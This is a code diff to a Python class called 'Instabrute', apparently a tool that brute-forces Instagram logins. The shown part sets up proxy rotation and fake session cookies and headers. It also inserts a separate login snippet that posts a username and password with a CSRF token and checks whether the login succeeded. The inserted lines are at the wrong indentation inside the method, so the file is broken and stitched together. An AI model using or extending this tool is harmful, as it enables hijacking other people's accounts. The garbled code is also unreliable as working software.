@@ -93,6 +93,21 @@ class Instabrute():
 			sess.proxies = { "http": self.CurrentProxy, "https": self.CurrentProxy }
 
 		#build requests headers
+		url = 'https://www.instagram.com/accounts/login/'
+url_main = url + 'ajax/'
+auth = {'username': 'login', 'password': 'pass'}
+headers = {'referer': "https://www.instagram.com/accounts/login/"}
+
+with requests.Session() as s:
+    req = s.get(url)
+    headers['x-csrftoken'] = req.cookies['csrftoken']
+    s.post(url_main, data=auth, headers=headers)
+    # Now, you can use 's' object to 'get' response from any instagram url
+    # as a logged in user.
+    r = s.get('https://www.instagram.com/accounts/edit/')
+    # If you want to check whether you're getting the correct response,
+    # you can use this:
+    print(auth['username'] in r.text)  # which returns 'True'
 		sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
 		sess.headers.update({
 			'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
